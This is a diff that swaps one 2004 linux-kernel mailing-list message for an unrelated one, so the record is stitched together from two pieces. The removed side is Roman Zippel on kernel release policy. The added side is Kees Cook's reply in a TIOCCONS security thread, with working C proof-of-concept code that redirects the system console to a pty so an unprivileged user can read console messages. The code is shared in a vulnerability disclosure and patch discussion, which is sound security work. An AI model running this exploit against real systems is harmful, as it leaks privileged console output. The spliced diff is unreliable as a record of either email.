@@ -1,48 +1,84 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S264704AbUHYVev@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S268844AbUHYVPV@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S264704AbUHYVev (ORCPT <rfc822;willy@w.ods.org>);
-	Wed, 25 Aug 2004 17:34:51 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S268991AbUHYVcg
+	id S268844AbUHYVPV (ORCPT <rfc822;willy@w.ods.org>);
+	Wed, 25 Aug 2004 17:15:21 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S268703AbUHYVFR
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Wed, 25 Aug 2004 17:32:36 -0400
-Received: from scrub.xs4all.nl ([194.109.195.176]:42690 "EHLO scrub.xs4all.nl")
-	by vger.kernel.org with ESMTP id S268825AbUHYVPY (ORCPT
+	Wed, 25 Aug 2004 17:05:17 -0400
+Received: from hera.kernel.org ([63.209.29.2]:30636 "EHLO hera.kernel.org")
+	by vger.kernel.org with ESMTP id S268760AbUHYVDs (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Wed, 25 Aug 2004 17:15:24 -0400
-Date: Wed, 25 Aug 2004 23:14:53 +0200 (CEST)
-From: Roman Zippel <zippel@linux-m68k.org>
-X-X-Sender: roman@scrub.home
-To: "Martin J. Bligh" <mbligh@aracnet.com>
-cc: Linus Torvalds <torvalds@osdl.org>,
-       Daniel Andersen <anddan@linux-user.net>,
-       "Sartorelli, Kevin" <Kevin.Sartorelli@openpolytechnic.ac.nz>,
-       fraga@abusar.org, linux-kernel@vger.kernel.org
-Subject: Re: Linux 2.6.9-rc1
-In-Reply-To: <147680000.1093445547@[10.10.2.4]>
-Message-ID: <Pine.LNX.4.61.0408252255320.12756@scrub.home>
-References: <4B2093FFC31B7A45862B62A376EA7176033C058D@mickey.topnz.ac.nz><412BE5CC.8020303@linux-user.net>
- <Pine.LNX.4.58.0408241818030.17766@ppc970.osdl.org> <147680000.1093445547@[10.10.2.4]>
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+	Wed, 25 Aug 2004 17:03:48 -0400
+To: linux-kernel@vger.kernel.org
+From: Kees Cook <kees@osdl.org>
+Subject: Re: [Patch] TIOCCONS security
+Date: Wed, 25 Aug 2004 14:03:41 -0700
+Organization: OSDL
+Message-ID: <pan.2004.08.25.21.03.41.684647@osdl.org>
+References: <20040825151106.GA21687@suse.de> <20040825161504.A8896@infradead.org> <20040825161630.B8896@infradead.org> <20040825161837.GB21687@suse.de>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Trace: build.pdx.osdl.net 1093467822 1841 172.20.1.16 (25 Aug 2004 21:03:42 GMT)
+X-Complaints-To: abuse@osdl.org
+NNTP-Posting-Date: Wed, 25 Aug 2004 21:03:42 +0000 (UTC)
+User-Agent: Pan/0.14.2.91 (As She Crawled Across the Table (Debian GNU/Linux))
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hi,
+On Wed, 25 Aug 2004 18:18:37 +0200, Olaf Dabrunz wrote:
+> The bottom line is, that I do not see why normal users should be able to
+> use TIOCCONS. Hijacking console output is a security problem, which has
+> been found quite some time ago on SunOS as well
+> (http://www.cert.org/advisories/CA-1990-12.html).
 
-On Wed, 25 Aug 2004, Martin J. Bligh wrote:
+Confirmed.  If you run the following code as a regular user, you can see
+messages.  (BTW: don't do a "tail -f /dev/console".  For reasons I don't
+understand, it writes endless CRs to which ever tty you happen to have
+open):
 
-> My assumption would be that once 2.6.9 is released, it's not uber-stable
-> immediately ... so it'd be nice to keep at least one minor rev back
-> going on the bugfix stream (eg 2.6.8.X) .... for people who want an 
-> uber-stable kernel. Doing more than 1 back would indeed seem 
-> counter-productive.
+# echo "ew. information leak." >> /dev/console
 
-In this case it would make more sense to get 2.6.9.1 released as quickly 
-as possible instead of trying to fix old releases.
-An important aspect to keep in mind is that 2.6.8.1 is an official release 
-and people (which not necessarily read lkml and don't complain yet) expect 
-being able to upgrade from one release to the next by applying a single 
-incremental patch. Making an official patch release against some earlier 
-release will certainly cause confusion.
 
-bye, Roman
+/* lifted from CA-1990-12 exploit code */
+#include <sys/types.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <termio.h>
+#include <errno.h>
+
+main()
+{
+  int m,s;
+  char buf[1024];
+  char *l;
+  size_t bytes;
+
+  /* probably unused tty */
+  static char lastpty[]="/dev/ptyvf";
+
+  if((m=open(lastpty,O_RDWR)) == -1) {
+    perror(lastpty);
+    exit(1);
+  }
+
+  lastpty[5]='t';
+  if((s=open(lastpty,O_RDWR)) == -1) {
+    perror(lastpty);
+    exit(1);
+  }
+
+  if(ioctl(s,TIOCCONS) == -1) {
+    perror("TIOCONS");
+    exit(1);
+  }
+
+  do {
+    if ((bytes=read(m,buf,sizeof buf))<0 && errno!=EINTR)
+          return 1;
+    write(fileno(stdout),buf,bytes);
+  } while (1);
+
+  return 0;
+}
+
